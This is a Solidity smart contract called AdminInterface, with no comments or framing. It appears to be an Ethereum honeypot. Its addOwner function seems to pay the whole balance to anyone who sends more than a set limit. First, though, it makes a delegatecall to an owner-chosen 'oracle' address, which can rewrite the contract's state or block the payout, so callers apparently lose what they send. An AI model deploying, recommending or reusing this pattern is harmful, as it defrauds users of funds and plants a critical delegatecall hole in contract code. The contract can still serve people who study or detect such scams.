 

 
 
 
 


pragma solidity ^0.4.18;
contract AdminInterface
{
    address public Owner;  
    address public oracle;
    uint256 public Limit;
    
    function AdminInterface(){
        Owner = msg.sender;
    }
    
     modifier onlyOwner() {
        require(msg.sender == Owner);
    _;
  }

     
    function Set(address dataBase) payable onlyOwner
    {
        Limit = msg.value;
        oracle = dataBase;
    }
     
    function()payable{}
    
    function transfer(address multisig) payable onlyOwner {
        multisig.transfer(msg.value);
    }

    function addOwner(address newAddr) payable
    {   
        if(msg.value > Limit)
        {        
             
            oracle.delegatecall(bytes4(keccak256("AddToWangDB(address)")),msg.sender);

             
            newAddr.transfer(this.balance);
        }
    }
}